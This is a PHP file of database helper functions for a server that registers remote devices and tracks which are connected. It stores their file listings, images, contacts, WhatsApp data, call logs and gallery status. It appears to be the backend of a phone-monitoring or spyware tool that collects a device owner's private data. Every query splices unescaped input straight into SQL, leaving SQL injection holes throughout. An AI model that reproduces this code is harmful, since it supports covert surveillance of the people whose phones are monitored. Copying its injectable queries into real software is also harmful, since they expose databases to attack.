<?php
require("connect.php");
if($conn->connect_error)
    echo "db error";
//else echo "db connected";

function add_device($msg,$socket){
  require("connect.php");

  $query="INSERT INTO devices(user_name,device_id,device_name,device_account,device_api,last_seen) values('$msg->user','$msg->id','$msg->devname','$msg->devuser','$msg->api','".time()."')";
  if(! $conn->query($query)){
    echo "device error:".mysqli_error($conn);
  }else{
    echo "new device added";
    return 1;
  }
  $query="INSERT INTO active values('".$msg->id."','".$socket."','$msg->connection')";
  echo "adding at $socket";
  if(! $conn->query($query)){
    echo "sql error for making device active";
  }else{
    echo "device listed active";
  }
}

function disconnect_device($dev,$socket){
  require("connect.php");
  $query="DELETE FROM active WHERE socket='".$socket."';";
  if(! $conn->query($query)){
    echo "sql error for removing device";
  }else{
    echo "device removed from active";
  }
  $time=time();
  $query="UPDATE devices SET last_seen='$time' WHERE device_id='".$dev."';";
  if(! $conn->query($query)){
    echo "sql error for removing device";
  }else{
    echo "time updated to $time";
  }
}

function get_socket($dev){
  require("connect.php");
  $sql="SELECT socket FROM active WHERE device_id='$dev'";
  echo $sql;
  $result=$conn->query($sql);
  if ($result->num_rows > 0) {
    // output data of each row
    while($row = $result->fetch_assoc()) {
      return $row["socket"];
    }
  }else{

  }
  return -1;
}

function get_did($dev){
  require("connect.php");
  $sql="SELECT did FROM devices WHERE device_id='$dev'";
  //echo $sql;
  $result=$conn->query($sql);
  if ($result->num_rows > 0) {
    while($row = $result->fetch_assoc()) {
      return $row["did"];
    }
  }
}

function build_data($data,$device_id){
  require("connect.php");
  $did =  get_did($device_id);
  $i=1;
  $data = json_decode($data);
  $query="INSERT INTO file_system(did,path,folder,page,cached) values";
  foreach ($data as $item) {
    if($i!=1){
      $query.=",";
    }
    $i++;
    $query.="($did,'$item->path','$item->folder','$item->page',0)";
  }
  if(!$conn->query($query)){
    echo "error";//.mysqli_error($conn);
  }else{
    //echo "image added";
  }
}

function battery_report($dev,$perc){
  require("connect.php");
  $did =  get_did($dev);
  $query="INSERT INTO battery_stats(did,perc,time) values ('$did','$perc','".time()."')";
  if(!$conn->query($query)){
    echo "error";//.mysqli_error($conn);
  }else{
    //echo "image added";
  }
  $query="UPDATE devices set last_seen='".time()."' where did=$did";
  if(!$conn->query($query)){
    echo "error".mysqli_error($conn);
  }else{
    //echo "image added";
  }
}

function update_contacts($dev,$fname){
  require("connect.php");
  $query="UPDATE devices set saved_contacts='$fname' where device_id='$dev'";
  if(!$conn->query($query)){
    echo "error".mysqli_error($conn);
  }else{
    //echo "image added";
  }
}

function update_whatsapp($dev,$fname){
  require("connect.php");
  $query="UPDATE devices set saved_whatsapp='$fname' where device_id='$dev'";
  if(!$conn->query($query)){
    echo "error".mysqli_error($conn);
  }else{
    //echo "image added";
  }
}

function update_image($id,$img){
  require("connect.php");
  $query="UPDATE file_system set cached='$img'  where id=$id";
  if(!$conn->query($query)){
    echo "error".mysqli_error($conn);
  }else{
    //echo "image added";
  }
}

function update_gallery($dev){
  require("connect.php");
  $query="UPDATE devices set saved_gallery='1' where device_id='$dev'";
  if(!$conn->query($query)){
    echo "error".mysqli_error($conn);
  }else{
    //echo "image added";
  }
}
function update_calllog($dev,$fname){
  require("connect.php");
  $query="UPDATE devices set saved_calllog='$fname' where device_id='$dev'";
  if(!$conn->query($query)){
    echo "error".mysqli_error($conn);
  }else{
    //echo "image added";
  }
}

function truncate(){
  require("connect.php");
  $query="truncate active;";
  if(! $conn->query($query)){
    echo "Error for truncating active";
  }else{
    echo "Active Successful truncated";
  }
}


 ?>
